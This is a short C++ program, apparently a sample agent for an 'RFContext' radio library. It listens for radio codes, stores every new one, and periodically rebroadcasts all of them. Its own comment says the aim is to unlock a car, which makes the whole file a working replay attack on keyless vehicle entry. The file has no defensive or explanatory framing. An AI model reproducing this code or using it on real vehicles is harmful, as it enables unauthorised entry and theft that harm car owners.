#include "sample/RFContext.h"
#include <vector>
#include <algorithm>
#include <unistd.h>

using namespace std;

const int BROADCAST_INTERVAL = 3000;

/**
 * Agent that will retain any codes observed, then replay them in attempt to unlock car.
 */
int main(int argc, char *argv[]){
	RFContext ctx = RFContext();
	vector<int> codes;
	
	int iterCount = 0;
	while(1){
		// If message is ready for receipt
		if(ctx.available()){
			int value = ctx.getReceivedValue();
			if(value != 0){
				// If not dup
				if (find (codes.begin(), codes.end(), value) == codes.end()){
					codes.push_back(value);
					printf("GOT CODE %i\n", value);
				}
			}
			// If time to yell, do
			if(iterCount % BROADCAST_INTERVAL == 0){
				printf("YELLIN\n");
				for(int i: codes){
					ctx.send_code(i);
				}
			}
			fflush(stdout);
			// ctx.resetAvailable();
		}
		
		usleep(100);
		iterCount++;
	}
	return 0;
}
